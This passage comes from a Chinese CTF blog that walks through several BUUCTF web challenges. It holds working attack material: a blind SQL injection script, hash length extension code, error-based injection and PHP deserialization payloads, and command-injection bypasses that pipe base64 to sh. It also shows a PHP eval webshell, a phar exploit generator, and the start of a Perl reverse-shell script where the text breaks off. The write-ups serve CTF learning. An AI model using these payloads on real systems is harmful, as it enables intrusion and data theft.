将构造好的文件依次上传，然后拿到文件储存的路径，这里需要说明：前面讲过了，auto_append_file和auto_prepend_file的作用是在在要执行的文件中包含我们指定的文件，在回显中我们看到，相同文件夹下还包含index.php文件，那么利用它便可以拿到shell。蚁剑连接拿flag用蚁剑连接，在根目录即可拿到flag：关于.user.ini文件构成的php后门还可以参考：https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html [CISCN 2019华北]HackWorld题目分析打开链接看到如下的输入框：提示我们flag在flag表中的flag字段，一个SQL注入题，抓包发现输入框的值会通过参数id以POST的方式上传到服务端。测试对输入的限制，结果如下： id=1 Hello, glzjin wants a girlfriend.id=1' bool(false)id=1'+空格 SQL Injection Checked.id=1'# SQL Injection Checked. 我们发现，当输入为1的时候回显Hello, glzjin wants a girlfriend.应该是一个正确的回显，但是输入1'回显bool(false)，并且对于与注入相关的字符会回显SQL Injection Checked.，因此，判断是一个布尔盲注。当输入的表达式为1的时候，会给出正确的回显，那么我们便可以通过在输入框构造结果为1并且逐字符地读取flag字段内容的语句便可以读出flag。 解题可以用下面的布尔盲注脚本拿flag： import requestsimport timeurl = \"http://b9b3fd3f-2f40-4927-8d69-50ffc78f9a4a.node3.buuoj.cn/index.php\"payload = { \"id\" : \"\"}result = \"\"for i in range(1,100): l = 33 r =130 mid = (l+r)&gt;&gt;1 while(l&lt;r): payload[\"id\"] = \"0^\" + \"(ascii(substr((select(flag)from(flag)),{0},1))&gt;{1})\".format(i,mid) html = requests.post(url,data=payload) print(payload) if \"Hello\" in html.text: l = mid+1 else: r = mid mid = (l+r)&gt;&gt;1 if(chr(mid)==\" \"): break result = result + chr(mid) print(result)print(\"flag: \" ,result) [De1CTF 2019]SSRF Me题目分析：首先拿到源码，是Flask写的： from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if \"scan\" in self.action: tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w') resp = scan(self.param) if (resp == \"Connection Timeout\"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if \"read\" in self.action: f = open(\"./%s/result.txt\" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = \"Action Error\" else: result['code'] = 500 result['msg'] = \"Sign Error\" return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False#generate Sign For Action Scan.@app.route(\"/geneSign\", methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(\"param\", \"\")) action = \"scan\" return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) ip = request.remote_addr if(waf(param)): return \"No Hacker!!!!\" task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/')def index(): return open(\"code.txt\",\"r\").read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \"Connection Timeout\"def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(\"gopher\") or check.startswith(\"file\"): return True else: return Falseif __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80) 我们发现，代码中定义了一个task类，其中主要包括三部分：__init__()、Exec()、checkSign。__init__()中以用户的IP生成一个沙箱： def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) Exec()可以执行一些操作： def Exec(self): result = {} result['code'] = 500 if (self.checkSign()): if \"scan\" in self.action: tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w') resp = scan(self.param) if (resp == \"Connection Timeout\"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if \"read\" in self.action: f = open(\"./%s/result.txt\" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = \"Action Error\" else: result['code'] = 500 result['msg'] = \"Sign Error\" return result 我们可以看到，Exec()函数可以执行scan操作，对目标文件进行扫描并把结果存在result.txt中；read操作可以读取ressult.txt中的内容。同时param又是用户输入，那么通过利用param和上述两个操作，进行SSRF以拿到flag。 往下我们看到三个路由： @app.route(\"/geneSign\", methods=['GET', 'POST'])def geneSign(): param = urllib.unquote(request.args.get(\"param\", \"\")) action = \"scan\" return getSign(action, param)@app.route('/De1ta',methods=['GET','POST'])def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) ip = request.remote_addr if(waf(param)): return \"No Hacker!!!!\" task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route('/')def index(): return open(\"code.txt\",\"r\").read() /geneSign路由：获得param参数，通过action和param生成签名。并且在服务端的签名是通过action=&quot;scan&quot;生成的，那就限制了用户执行的方法。/De1ta路由：获取cookie中的action和param以及签名sign，如果param合法则生成task对象，并返回执行的内容。/路由：读取代码。 解题思路我们从前面知道，服务端的签名已经限制为action=&quot;scan&quot;了，因此如果我们传入的方法有read那签名值将会不同，将不能实现读取。因此我们需要绕过sign的限制。我们可以发现getSign其实是有漏洞的： def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() 即当我们输入param=flag.txtread的时候，那sign值就是包含read和scan的了，也就可以实现对文件的读取了。 解题这里有两种方法，第一种是利用SSRF，也是本题的考点，第二种是hash长度扩展攻击，看别的大佬的思路才知道的。 SSRF首先我们在/geneSign路由中利用param=flag.txtread生成一个签名：然后通过/De1ta路由生成服务端的签名，需要利用BP抓包改包：这里需要注意，我们在/De1ta路由是通过GET方式传param的，但是Cookie需要我们手动加入，从下面这段代码可知：我们需要在cookie中写入action和sign值 def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) 从而实现通过构造sign绕过限制实现SSRF读取服务器资源，拿到flag。 Hash长度扩展攻击哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了H(密钥 ∥ 消息)此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。一般满足下面条件的情形可以进行哈希长度扩展攻击： 1、准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature/签名）； 2、让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文； 3、服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值 详细可参考：https://www.freebuf.com/articles/web/69264.html该题中，sign的计算： hashlib.md5(secert_key + param + action).hexdigest() 显然满足这种情况，因此可以进行哈希长度扩展攻击。脚本如下： import hashpumpyimport requestsimport urllib.parsetxt1 = 'flag.txt'r = requests.get('http://f335feee-943e-406b-8fc6-e5d65f709d15.node3.buuoj.cn/geneSign', params={'param': txt1})sign = r.texthash_sign = hashpumpy.hashpump(sign, txt1 + 'scan', 'read', 16)r = requests.get('http://f335feee-943e-406b-8fc6-e5d65f709d15.node3.buuoj.cn/De1ta', params={'param': txt1}, cookies={ 'sign': hash_sign[0], 'action': urllib.parse.quote(hash_sign[1][len(txt1):])})print(r.text) [网鼎杯 2018]Fakebook题目分析进入链接，是一个可以注册和登录的页面，这里的注册页面是以POST上传数据的，利用sqlmap测试发现有POST注入，具体方法是： 1、注册用户时用BP抓包，保存POST表单的数据到文件; 2、然后利用sqlmap爆库： python sqlmap.py -r \"the path of the catched file\" --dump --dbs 结果如下：这个截图中没有体现出完整的数据库信息，完整的序列化内容中包含的还有blog的地址，下面的payload中可以看到。 经过测试，在wiew.php路径下存在GET注入，这里存在报错注入，可以利用extractvalue()和updatexml()进行测试，但是我在用extractvalue()进行测试时失败了，用updatexml()可以成功注入。利用extractvalue()的报错注入可参考我之前的文章RootersCTF-Babyweb-WriteUp。报错注入可参考：https://blog.csdn.net/zpy1998zpy/article/details/80631036 进行GET注入利用常规的手注方法，结合updatexml()以实现报错注入： 1、爆库名 /view.php?no=1 and updatexml(1,make_set(3,'~',(select database())),1)# 2、爆表名 /view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)# 3、爆列名 /view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(column_name) from information_schema.columns where table_name=\"users\")),1)# 4、爆字段 /view.php?no=1 and updatexml(1,make_set(3,'~',(select data from users)),1)# 我们看到，最后爆出的字段知包含了一串序列化的内容，也可以根据POST注入的结果发现，而并没有拿到flag。这里要注意，union select联合查询会被检测出，因此用\\**\\来绕过。参考网上的WP发现，该题并非只考察注入，还考察了SSRF、反序列化构造file文件协议。 利用File协议进行SSRF读取flag文件御剑扫描发现robots.txt和flag.php文件，并且根据前面报错注入的返回页面可见，flag.php文件是存在/var/www/html/下的。同时在robots.txt中发现了备份文件/user.php.bak，其源码如下： &lt;?phpclass UserInfo{ public $name = \"\"; public $age = 0; public $blog = \"\"; public function __construct($name, $age, $blog) { $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-&gt;get($this-&gt;blog); } public function isValidBlog () { $blog = $this-&gt;blog; return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog); }} 可以发现get()函数总传参是一个url，因此猜测存在SSRF，前面我们也知道了可以利用file://协议来读取flag文件，可以构造file:///var/www/html/flag.php语句并将其作为用户的blog地址写入，最后利用联合查询和反序列化将该语句写入到数据库，payload如下： /view.php?no=0/**/union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:1:\"1\";s:3:\"age\";i:1;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}' 效果如下：此时，我们写入的可以读取文件的blog地址已经奏效，查看源码可以看到一串base64的编码，解码即为读取的flag.php的内容。 [极客大挑战 2019]Havefun目测是签到题，源码中提示： $cat=$_GET['cat'];echo $cat;if($cat=='dog'){ echo 'Syc{cat_cat_cat_cat}';} 简单，?cat=dog即可 [RoarCTF 2019]EasyJava考察web.xml的泄露，Javaweb没学过…不过这个题目学到了一点：类似于题目给的Help文件下载失败的时候可以尝试改变请求方式去下载。附上一些有关源码泄露的网站：https://blog.csdn.net/wy_97/article/details/78165051 [极客大挑战 2019]Secret File进去题目之后看源码，发现Archive_room.php文件，点进去之后给了一个按钮，这个按钮存在302跳转，因此需要BP抓包。抓包发现，点击时候先访问的是action.php，在改文件中看到了提示的secr3t.php文件，再查看这个文件给了源码： &lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\")){ echo \"Oh no!\"; exit(); } include($file); //flag放在了flag.php里?&gt; 容易看出是文件包含，利用php伪协议读取即可： ?file=php://filter/convert.base64-encode/resource=flag.php [GXYCTF 2019]Ping Ping Ping根据题目提示和参数ip可知，与命令执行相关第一步，利用|可以执行ls命令，读取内容： ?ip=127.0.0.1|ls 发现存在flag.php和index.php文件，但是直接利用cat flag.php去读取发现空格被ban，此处考察了绕过空格被ban的方法（与linux系统命令的执行相关）： $IFS${IFS}$IFS$1 //$1中的数字可以更改&lt;&lt;&gt;{cat,flag.php}%20%09 通过尝试发现$IFS$1可以绕过空格此时又提示flag被ban，绕过的方法也比较多样： 变量拼接：ip=1;a=g;cat$IFS$1fla$a.php内联执行：ip=1;cat$IFS$1`ls` //注意这里是反单引号，命令会将反引号中的输出作为输入进行执行利用sh/bash： ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 利用内联执行方法绕过，需要到控制台的sources下查看内容，如图： [极客大挑战 2019]PHP一道PHP反序列化题目，主要考察了private定义字段的绕过方法。 题目分析提示有备份文件，扫后台可以得知是www.zip，下载文件、审计源码，在class.php中发现了反序列化的代码： &lt;?phpinclude 'flag.php';error_reporting(0);class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } function __wakeup(){ $this-&gt;username = 'guest'; } function __destruct(){ if ($this-&gt;password != 100) { echo \"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\"; echo \"You name is: \"; echo $this-&gt;username;echo \"&lt;/br&gt;\"; echo \"You password is: \"; echo $this-&gt;password;echo \"&lt;/br&gt;\"; die(); } if ($this-&gt;username === 'admin') { global $flag; echo $flag; }else{ echo \"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\"; die(); } }}?&gt; 根据代码逻辑可知，我们需要绕过wakeup()函数，这个很简单，更改序列化之后类的属性个数即可。 关于wakeup()函数：与sleep()函数相反，sleep()函数，是在序序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。绕过方法：当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行。 我们可以看到，需要绕过wakeup()函数，然后令username==admin，password==100才能执行echo $flag，因此需要构造这两个条件，但是我们发现，这两个字段都是private定义的，绕过的时候需要更改序列化之后属性的格式： 1、private属性序列化的时候格式是 %00类名%00成员名 2、protected属性序列化的时候格式是 %00*%00成员名 可参考：https://www.cnblogs.com/fish-pompom/p/11126473.html根据这些信息我们便可以构造payload。 构造payload首先在class.php中加入下列代码，得到一个实例化对象的反序列化： $a = new Name('admin',100);$b=serialize($a);echo $b; 拿到反序列化的字符串： O:4:\"Name\":2:{s:14:\"Nameusername\";s:5:\"admin\";s:14:\"Namepassword\";i:100;} 然后我们把属性值2改成3以绕过wakeup()最后更改两个属性名的格式如下： O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} 最后，在index.php中我们发现GET传参select，构造最终payload ?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;} 即可拿到flag。 [0CTF 2016]piapiapia一道反序列化逃逸漏洞利用题目。 题目分析进入题目之后是一个登录页面，尝试登录管理员，失败，也没有注册按钮…通过扫后台发现存在www.zip文件，果断下载了，成功拿到题目源码。压缩包下包含`class.php`、`config.php`、`index.php`、`profile.php`、`register.php`、`update.php`几个有用的文件。解题关键在于如下部位：首先是config.php文件： &lt;?php $config['hostname'] = '127.0.0.1'; $config['username'] = 'root'; $config['password'] = ''; $config['database'] = ''; $flag = '';?&gt; 由此可知，flag存在于该文件之下，需要想办法读取改文件内容。同时，在profile.php文件下有与读取文件内容相关的代码： &lt;?php require_once('class.php'); if($_SESSION['username'] == null) { die('Login First'); } $username = $_SESSION['username']; $profile=$user-&gt;show_profile($username); if($profile == null) { header('Location: update.php'); } else { $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo']));?&gt; 可知，控制photo变量为config.php我们便可以读取到其内容。同时看到，这里存在一个反序列化的函数，初步判断解题与它相关。在update.php文件中找到了将字符串序列化的地方： &lt;?php require_once('class.php'); if($_SESSION['username'] == null) { die('Login First'); } if($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) { $username = $_SESSION['username']; if(!preg_match('/^\\d{11}$/', $_POST['phone'])) die('Invalid phone'); if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email'])) die('Invalid email'); if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10) die('Invalid nickname'); $file = $_FILES['photo']; if($file['size'] &lt; 5 or $file['size'] &gt; 1000000) die('Photo size error'); move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name'])); $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $user-&gt;update_profile($username, serialize($profile)); echo 'Update Profile Success!&lt;a href=\"profile.php\"&gt;Your Profile&lt;/a&gt;'; } else {?&gt; 可以看到，此处的代码是对profile数组中的phone、email、nickname、photo进行的序列化，序列化之后的效果如下： a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:11:\"123@qq.com\";s:8:\"nickname\";s:3:\"123\";s:5:\"photo\";s:39:\"upload/f3b94e88bd1bd325af6f62828c8785dd\";} 这里a:4指的是由一个数组序列化而来，并且有4个值。如果是对象的话，就是把a改成O。然后是一个键值名，一个变量值：s:5:&quot;phone&quot;:第一个键名，是string类型的，长度为五;s:11:&quot;11111111111&quot;:第一个变量值，string类型，长度为11。后面的也是这个规律。这里存在我们要利用的反序列化漏洞：如果我们在这个序列化字符串的后面，再加上一些字符，后面的字符是不会被反序列化的。最后在class.php文件中还有两个需要过滤，并且对拿flag有效的正则匹配： public function filter($string) { $escape = array('\\'', '\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string);} 这里会对我们输入的内容进行替换，比如将where替换为hacker，这对我们的解题很重要。 至此，解题思路已经很明确了，就是我们通过控制输入，将序列化之后的photo对应上config.php，通过抓包发现nickname是入手点，从前面写到的序列化的字符串也能看出来。因此在nickname后面加上&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}就能实现，最后效果如下： a:4:{s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:11:\"123@qq.com\";s:8:\"nickname\";a:1:{i:0;s:3:\"123\";}s:5:\"photo\";s:10:\"config.php\";}s:39:\"upload/f3b94e88bd1bd325af6f62828c8785dd\";} 这里就实现了photo与config.php的对应，而括号后面的upload等不会被执行。注意这里我们看到nickname是一个数组型的，因为我们前面提到过，有对nickname的正则匹配，所有我们需要用数组来绕过。现在的问题就是&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}这34字符，使我们在传参的时候要手动加入到nickname数组中的，而想要打到我们的目的，就必须把它们从nickname数组中挤出去，这个时候我们前面说到的where与hacker的替换就派上用场了：我们可以在 nickname数组中写入34个where，那么就替换成了34个hacker，但是序列化之后的每个变量名和常量值都是有定值的，比如上面的s:5表示长度是5，所以替换之后，34个where之后紧跟的&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}就不在属于nickname数组了，也就达到了我们的目的，部分payload如下： nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";} 解题我们首先先到register.php下注册个账号，登录之后更新用户的信息，这个时候通过BP抓包写入payload，然后将nickname改成nickname[]，同时将我们构造好的payload写入，如图：从响应包中，我们看到，payload已经成功打入，此时，我们上传的图片存放的路径读取的也就是config.php的内容了，此时去profile.php下打开图片的链接即可看到一串base64，解码即可拿到flag。 这道题目对反序列化漏洞的认识又进一步加深，学到了学到了。 [极客大挑战 2019]Knife进入题目，解题方法就很明显了，提示了Knife，并且给了后门语句eval($_POST[&quot;Syc&quot;]);，用蚁剑连接下列链接： http://514be013-67a5-422b-ae7b-941c105e248b.node3.buuoj.cn/?Knife.php 连接密码很明显：Syc，连接即可拿flag。 [CISCN2019 华北]Dropbox一个考察phar反序列化的问题。相关知识参考：https://blog.ripstech.com/2018/new-php-exploitation-technique/https://paper.seebug.org/680/ 题目分析进入题目之后，通过注册并登录账户，发现可以上传文件，上传文件之后进入到管理面板，这个时候我们发现可以对我们的文件进行下载和删除的操作：这个地方存在可以的地方，在下载文件的时候，抓包发现，下载文件的规则很简单：那么我们可以测试是否可以下载别的文件，通过改包利用../../xxx.php测试可行性，结果真的能下载文件：通过下载index.php文件，我们依次下载到关键的class.php和delete.php文件，内容如下：class.php文件： &lt;?phperror_reporting(0);$dbaddr = \"127.0.0.1\";$dbuser = \"root\";$dbpass = \"root\";$dbname = \"dropbox\";$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User { public $db; public function __construct() { global $db; $this-&gt;db = $db; } public function user_exist($username) { $stmt = $this-&gt;db-&gt;prepare(\"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;\"); $stmt-&gt;bind_param(\"s\", $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-&gt;user_exist($username)) { return false; } $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-&gt;db-&gt;prepare(\"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);\"); $stmt-&gt;bind_param(\"ss\", $username, $password); $stmt-&gt;execute(); return true; } public function verify_user($username, $password) { if (!$this-&gt;user_exist($username)) { return false; } $password = sha1($password . \"SiAchGHmFx\"); $stmt = $this-&gt;db-&gt;prepare(\"SELECT `password` FROM `users` WHERE `username` = ?;\"); $stmt-&gt;bind_param(\"s\", $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) { return true; } return false; } public function __destruct() { $this-&gt;db-&gt;close(); }}class FileList { private $files; private $results; private $funcs; public function __construct($path) { $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(\".\", $filenames); unset($filenames[$key]); $key = array_search(\"..\", $filenames); unset($filenames[$key]); foreach ($filenames as $filename) { $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); } } public function __call($func, $args) { array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) { $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); } } public function __destruct() { $table = '&lt;div id=\"container\" class=\"container\"&gt;&lt;div class=\"table-responsive\"&gt;&lt;table id=\"table\" class=\"table table-bordered table-hover sm-font\"&gt;'; $table .= '&lt;thead&gt;&lt;tr&gt;'; foreach ($this-&gt;funcs as $func) { $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;' . htmlentities($func) . '&lt;/th&gt;'; } $table .= '&lt;th scope=\"col\" class=\"text-center\"&gt;Opt&lt;/th&gt;'; $table .= '&lt;/thead&gt;&lt;tbody&gt;'; foreach ($this-&gt;results as $filename =&gt; $result) { $table .= '&lt;tr&gt;'; foreach ($result as $func =&gt; $value) { $table .= '&lt;td class=\"text-center\"&gt;' . htmlentities($value) . '&lt;/td&gt;'; } $table .= '&lt;td class=\"text-center\" filename=\"' . htmlentities($filename) . '\"&gt;&lt;a href=\"#\" class=\"download\"&gt;下载&lt;/a&gt; / &lt;a href=\"#\" class=\"delete\"&gt;删除&lt;/a&gt;&lt;/td&gt;'; $table .= '&lt;/tr&gt;'; } echo $table; }}class File { public $filename; public function open($filename) { $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) { return true; } else { return false; } } public function name() { return basename($this-&gt;filename); } public function size() { $size = filesize($this-&gt;filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; } public function detele() { unlink($this-&gt;filename); } public function close() { return file_get_contents($this-&gt;filename); }}?&gt; 我们看到，其中有多个类的定义，其中delete()函数中的unlink()引起注意，因为这个函数在处理phar文件时会将序列化的内容反序列化，这一点在前面提供的第二个链接有讲到，还提到了其他的函数，如下:再看delete.php： &lt;?phpsession_start();if (!isset($_SESSION['login'])) { header(\"Location: login.php\"); die();}if (!isset($_POST['filename'])) { die();}include \"class.php\";chdir($_SESSION['sandbox']);$file = new File();$filename = (string) $_POST['filename'];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) { $file-&gt;detele(); Header(\"Content-type: application/json\"); $response = array(\"success\" =&gt; true, \"error\" =&gt; \"\"); echo json_encode($response);} else { Header(\"Content-type: application/json\"); $response = array(\"success\" =&gt; false, \"error\" =&gt; \"File not exist\"); echo json_encode($response);}?&gt; 其中$file-&gt;delete()时便执行了unlink()函数。 那么我们上传一个phar文件，再去删除它，此处便可以控制通过phar://执行了我们上传的phar文件，便将文件中序列化的内容反序列化了，利用这个部分，我们便可以构造phar文件，来读取flag文件了。 构造phar文件网上找到了构造phar文件的脚本： &lt;?phpclass User { public $db;}class File { public $filename;}class FileList { private $files; public function __construct() { $file = new File(); $file-&gt;filename = \"/flag.txt\"; $this-&gt;files = array($file); }}$a = new User();$a-&gt;db = new FileList();$phar = new Phar(\"phar.phar\"); //后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub$o = new User();$o-&gt;db = new FileList();$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(\"exp.txt\", \"test\"); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt; 解题首先上传构造好的phar文件，这里需要注意：phar文件上传的时候必须伪装成image文件，通过BP抓包上传：然后删除文件，此时抓包，然后把要删除的文件名改为phar://phar.png/exp.txt，然后即可拿到flag： [RoarCTF 2019]Easy Calc网上有说这道题跟HTTP协议走私有关联，之前看过http走私的文章，但我觉得的更多的考察的就是参数过滤的绕过还有对输入字符做限制时候的绕过。不过这里可以再学习一下http走私，还学到了一些利用PHP的字符串解析特性Bypass的方法。 题目分析进入题目查看源码发现clac.php?num被ban了，同时在calc.php中可以拿到源码： &lt;?phperror_reporting(0);if(!isset($_GET['num'])){ show_source(__FILE__);}else{ $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $str)) { die(\"what are you want to do?\"); } } eval('echo '.$str.';');}?&gt; 首先对传参num进行了过滤，但是要想读出flag，又必须用num传参，这时候想到利用空格的绕过方法。补充一点知识： php的解析规则：当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，那么我们就可以利用这个特点绕过waf。 也就是说利用num传参就可以了。我们还看到/也被ban了，再想要查看目录下的内容，就需要借助一些系统函数了。利用chr()函数即可借助数字来构造被ban的字符，来最终读取flag，最终payload如下： /calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))","link":"/2020/02/07/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A0/"},{"title":"BUUCTF-web刷题Ⅲ","text":"BUU刷题记录之三了，刷题果然开眼界，不过… 我好菜😐，不是那个蔡😒 [HITCON 2017]SSRFme主要考察Perl下存在的漏洞：CVE-2016-1238和open命令导致命令执行的漏洞。利用此漏洞进行SSRF。 题目分析进入题目，给出了如下的源码： &lt;?php $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]); @mkdir($sandbox); @chdir($sandbox); $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"])); $info = pathinfo($_GET[\"filename\"]); $dir = str_replace(\".\", \"\", basename($info[\"dirname\"])); @mkdir($dir); @chdir($dir); @file_put_contents(basename($info[\"basename\"]), $data); highlight_file(__FILE__); 同时也给出了REMOTE_ADDR，这在后面解题用得到。分析代码我们可以梳理出其逻辑： 1.基于REMOTE_ADDR创建沙箱文件夹；2.将传入的URL带入命令GET执行。这里的GET命令是Lib for WWW in Perl中的命令，目的是模拟http的GET请求；3.利用pathinfo函数解析传入的filename参数，获取路径名最后一层文件夹创建并进入该路径；4.利用basename函数获取filename传参内容的最后以及文件夹名称；5.利用​file_put_contents函数将GET命令执行的结果写入以filename中的文件名命名的文件中。 这一道题涉及的知识之前没遇到过，需要好好学一学，参考网上的题解得知有两种解题思路： 利用Perl5的一个CVE 利用Perl的open命令进行命令执行 利用CVE-2016-1238漏洞大致构成原因是：` 当解析遇到了非定义的协议(定义的协议在perl5/LWP/Protocol文件夹下可以看到，默认支持GHTTP、cpan、data、file、ftp、gopher、http、https、loopback、mailto、nntp、nogo协议)时, 如GGBON://ggb0n.com，会自动读取当前目录下的URI目录并查看是否有对应协议的pm模块并尝试eval &quot;require xxx&quot;，这里我们的恶意pm模块就会被执行。 借此漏洞构造一个反弹shell的perl脚本放到自己的VPS上： #!/usr/bin/perl -w# perl-reverse-shell - A Reverse Shell implementation in PERLuse strict;use Socket;use FileHandle;use POSIX;my $VERSION = \"1.0\";# Where to send the reverse shell. Change these.my $ip = '127.0.0.1';my $port = 12345;# Optionsmy $daemon = 1;my $auth = 0; # 0 means authentication is disabled and any # source IP can access the reverse shellmy $authorised_client_pattern = 